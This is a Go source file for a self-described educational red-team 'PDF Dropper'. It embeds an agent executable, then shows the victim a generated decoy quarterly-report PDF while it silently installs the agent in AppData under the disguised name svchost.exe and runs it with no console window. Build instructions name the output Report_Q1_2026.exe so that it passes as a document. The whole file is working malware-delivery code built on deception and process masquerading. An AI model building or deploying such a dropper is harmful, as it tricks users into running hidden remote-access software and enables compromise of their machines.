package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

/*
  PDF Dropper — Educational Red Team Tool

  HOW IT WORKS:
  1. The real agent EXE is embedded at compile time (go:embed)
  2. When the user double-clicks this dropper:
     a. It drops a decoy PDF to %TEMP% and opens it (user sees a legit document)
     b. It drops the real agent to %APPDATA% and runs it silently (no console window)
  3. The user thinks they opened a PDF, while the agent runs in the background

  BUILD:
     Copy agent_client.exe into this folder, then:
     GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui" -o Report_Q1_2026.exe .

     The "-H windowsgui" flag is critical — it prevents a console window from appearing
*/

// Embed the real agent binary at compile time
//
//go:embed agent_client.exe
var agentPayload []byte

func main() {
	tempDir := os.TempDir()
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = tempDir
	}

	// ─── Step 1: Drop and open decoy PDF ───────────
	decoyPath := filepath.Join(tempDir, "Report_Q1_2026.pdf")
	if err := os.WriteFile(decoyPath, generateDecoyPDF(), 0644); err == nil {
		// Open the PDF with the default viewer — user sees a normal document
		exec.Command("cmd", "/C", "start", "", decoyPath).Start()
	}

	// ─── Step 2: Drop agent to a hidden location ───
	agentDir := filepath.Join(appData, "Microsoft", "WindowsCache")
	os.MkdirAll(agentDir, 0755)

	agentPath := filepath.Join(agentDir, "svchost.exe")

	// Only drop if not already running / present
	if _, err := os.Stat(agentPath); os.IsNotExist(err) {
		os.WriteFile(agentPath, agentPayload, 0755)
	}

	// ─── Step 3: Run agent silently (no console) ───
	cmd := exec.Command(agentPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
	cmd.Start()

	// Dropper exits — agent continues in background
}

// generateDecoyPDF creates a minimal but valid PDF document at runtime.
// This avoids needing to embed a separate PDF file.
func generateDecoyPDF() []byte {
	content := `BT /F1 24 Tf 72 700 Td (Quarterly Report Q1 2026) Tj ET
BT /F1 14 Tf 72 660 Td (Department of Computer Science) Tj ET
BT /F1 12 Tf 72 635 Td (University Research Division) Tj ET
BT /F1 11 Tf 72 590 Td (Executive Summary) Tj ET
BT /F1 10 Tf 72 570 Td (This document summarizes the progress of ongoing) Tj ET
BT /F1 10 Tf 72 555 Td (research projects for the first quarter of 2026.) Tj ET
BT /F1 10 Tf 72 525 Td (Project Alpha  -  Status: Active    Budget: 67%) Tj ET
BT /F1 10 Tf 72 510 Td (Project Beta   -  Status: Active    Budget: 45%) Tj ET
BT /F1 10 Tf 72 495 Td (Project Gamma  -  Status: Review    Budget: 82%) Tj ET
BT /F1 10 Tf 72 465 Td (Next scheduled review: July 2026) Tj ET
BT /F1 9 Tf 72 420 Td (Classification: Internal Use Only) Tj ET
BT /F1 8 Tf 72 50 Td (Generated automatically - Do not reply) Tj ET
`

	pdf := fmt.Sprintf(`%%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<</Font<</F1 4 0 R>>>>/Contents 5 0 R>>endobj
4 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj
5 0 obj<</Length %d>>stream
%sendstream
endobj
xref
0 6
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000266 00000 n 
0000000340 00000 n 
trailer<</Size 6/Root 1 0 R>>
startxref
900
%%%%EOF
`, len(content), content)

	return []byte(pdf)
}
